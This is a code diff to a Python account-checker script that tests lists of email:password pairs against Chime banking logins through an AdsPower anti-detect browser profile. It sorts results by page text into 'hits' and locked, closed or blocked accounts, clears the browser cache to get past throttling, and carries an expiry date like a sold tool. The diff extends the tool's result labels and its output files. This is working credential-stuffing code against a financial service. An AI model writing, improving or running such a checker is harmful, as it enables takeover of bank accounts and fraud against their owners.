@@ -18,8 +18,14 @@ EXPIRY_DATE = "2026-7-31 23:59:59"
 BASE_DIR = Path(sys.executable).parent if getattr(sys, "frozen", False) else Path(__file__).parent
 LOG_FILE = BASE_DIR / "log.txt"
 EMAIL_FILE = BASE_DIR / "email.txt"
-SUCCESS_FILE = BASE_DIR / "success.txt"
+HIT_FILE = BASE_DIR / "hit.txt"
 CUSTOM_FILE = BASE_DIR / "custom.txt"
+
+ADSPOWER_API_KEY = ""
+ADSPOWER_BASE_URL = ""
+PROFILE_ID = ""
+WAIT_TIME = 30
+SIGN_IN_WAIT = 2
 
 
 def load_settings():
@@ -51,9 +57,20 @@ BLOCKED_TEXT = "You have exceeded the maximum number of login attempts"
 INCORRECT_TEXT = "do not match our records"
 MOBILE_VERIFY_TEXT = "try logging in on your chime mobile app"
 TRY_AGAIN_TEXT = "please try again, and contact us at (844) 244-6363"
-NO_DEPOSIT_ACCOUNT_TEXT = (
-    "you cannot access the chime app since we were unable to open  a chime deposite account for you"
-)
+NO_DEPOSIT_ACCOUNT_TEXT = "unable to open a chime deposit account"
+ACCOUNT_CLOSED_TEXT = "your account has been closed"
+ACCOUNT_LOCKED_TEXT = "your account has been locked"
+NEED_SIGNUP_TEXT = "need to sign up, even if you had an account"
+CUSTOM_RESULT_LABELS = {
+    "Incomplete application": "incomplete application",
+    "blocked": BLOCKED_TEXT.lower(),
+    "mobile verify": MOBILE_VERIFY_TEXT,
+    "try again": TRY_AGAIN_TEXT,
+    "no deposit account": NO_DEPOSIT_ACCOUNT_TEXT,
+    "account closed": ACCOUNT_CLOSED_TEXT,
+    "account locked": ACCOUNT_LOCKED_TEXT,
+    "need signup": NEED_SIGNUP_TEXT,
+}
 CACHE_TYPES = [
     "local_storage",
     "indexeddb",
@@ -103,9 +120,10 @@ def check_expiry(expiry_date):
         sys.exit(1)
 
 
-def save_account(path, email, password):
+def save_account(path, email, password, label=None):
+    line = f"{email}:{password}:{label}" if label else f"{email}:{password}"
     with open(path, "a", encoding="utf-8") as file:
-        file.write(f"{email}:{password}\n")
+        file.write(f"{line}\n")
 
 
 def load_credentials(path):
@@ -216,6 +234,12 @@ def detect_login_result(browser):
         return "try again"
     if NO_DEPOSIT_ACCOUNT_TEXT in page:
         return "no deposit account"
+    if ACCOUNT_CLOSED_TEXT in page:
+        return "account closed"
+    if ACCOUNT_LOCKED_TEXT in page:
+        return "account locked"
+    if NEED_SIGNUP_TEXT in page:
+        return "need signup"
     if VERIFICATION_TEXT in browser.page_source:
         return "found"
     return False
@@ -241,19 +265,13 @@ def check_account(driver, email, password, wait, long_wait):
 
 
 def run():
+    global ADSPOWER_API_KEY, ADSPOWER_BASE_URL, PROFILE_ID, WAIT_TIME, SIGN_IN_WAIT
+
     try:
         ADSPOWER_API_KEY, ADSPOWER_BASE_URL, PROFILE_ID, WAIT_TIME, SIGN_IN_WAIT = load_settings()
     except Exception as error:
         log_error("Failed to load settings", error)
         sys.exit(1)
-
-    globals().update(
-        ADSPOWER_API_KEY=ADSPOWER_API_KEY,
-        ADSPOWER_BASE_URL=ADSPOWER_BASE_URL,
-        PROFILE_ID=PROFILE_ID,
-        WAIT_TIME=WAIT_TIME,
-        SIGN_IN_WAIT=SIGN_IN_WAIT,
-    )
 
     check_expiry(EXPIRY_DATE)
     log("Script started")
@@ -279,16 +297,18 @@ def run():
             index += 1
             email, password = credentials[0]
             log(f"[{index}/{total_accounts}] Checking {email}...")
+            result = None
             try:
                 result = check_account(driver, email, password, wait, long_wait)
                 log(f"{email}: {result}")
-                if result == "found":
-                    save_account(SUCCESS_FILE, email, password)
-                    log(f"{email}: saved to {SUCCESS_FILE.name}")
-                elif result == "incorrect":
+                if result == "incorrect":
                     log(f"{email}: incorrect password, not saved")
+                elif result == "found":
+                    save_account(HIT_FILE, email, password)
+                    log(f"{email}: saved to {HIT_FILE.name}")
                 elif result:
-                    save_account(CUSTOM_FILE, email, password)
+                    label = CUSTOM_RESULT_LABELS.get(result, str(result).lower())
+                    save_account(CUSTOM_FILE, email, password, label)
                     log(f"{email}: saved to {CUSTOM_FILE.name}")
             except TimeoutException as error:
                 log_error(f"{email}: login result not found", error)
@@ -297,6 +317,8 @@ def run():
             finally:
                 remove_credential(EMAIL_FILE, email, password)
                 log(f"{email}: removed from {EMAIL_FILE.name}")
+
+            if result == "try again":
                 try:
                     driver = clear_profile_cache(driver)
                     wait = WebDriverWait(driver, WAIT_TIME)
